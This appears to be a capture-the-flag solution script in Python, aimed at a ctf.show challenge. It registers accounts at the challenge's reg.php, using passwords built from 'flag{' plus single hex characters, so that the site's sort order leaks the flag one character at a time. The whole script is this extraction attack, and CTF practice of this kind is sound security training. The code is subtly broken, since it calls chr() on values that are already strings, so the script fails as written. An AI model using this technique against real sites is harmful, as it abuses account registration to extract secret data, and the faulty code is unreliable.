#Hausa_
#yige_yige_de_shoudong_tianjia_zimu_bing_shuaxinpwd_kanpaixu
import requests

baseurl = "http://0e9716bc-16d2-433b-a54b-2acdf2a90d94.chall.ctf.show/"
regurl = baseurl + "reg.php"

regdata={'username':'','email':'1@qq.com','nickname':'hausa','password':''}

basepwd = 'flag{'

base = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','-','}']
for i in base:
    pwd = basepwd + chr(i)
    regdata['password'] = pwd
    regdata['username'] = pwd
    requests.post(regurl, data=regdata)
    print(pwd)
